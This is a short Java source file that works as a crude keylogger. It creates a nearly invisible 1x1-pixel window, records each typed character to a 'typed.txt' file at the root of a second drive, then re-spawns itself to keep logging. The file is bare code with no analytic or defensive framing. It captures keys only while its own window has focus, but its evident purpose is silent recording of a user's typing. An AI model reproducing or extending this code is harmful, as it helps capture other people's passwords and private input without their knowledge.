package printtyped;

import javax.swing.*;
import java.awt.event.*;
import java.io.*;

public class copy implements Runnable ,KeyListener{

	JFrame f;
	Thread t;
	//astatic int i=0;
	copy()
	{
		t=new Thread(this,"chu");
		t.start();
	}
 
	public void run() {
		//i=i+1;
			f=new JFrame();
			f.setSize(1, 1);
			f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
			f.addKeyListener(this);
			f.setVisible(true);
			try {
				Thread.sleep(10);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
	}

	
	public void keyPressed(KeyEvent arg0) {
		
	}

	
	public void keyReleased(KeyEvent arg0) {
		
		
	}

	
	public void keyTyped(KeyEvent ke) {
		//System.out.println(ke.getKeyChar());
		File array[]=File.listRoots();
		try {
			FileOutputStream fis=new FileOutputStream(array[1].getAbsolutePath()+"typed.txt",true);
			fis.write(ke.getKeyChar());
			fis.close();
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		f.dispose();
		
		new copy();
	}

}
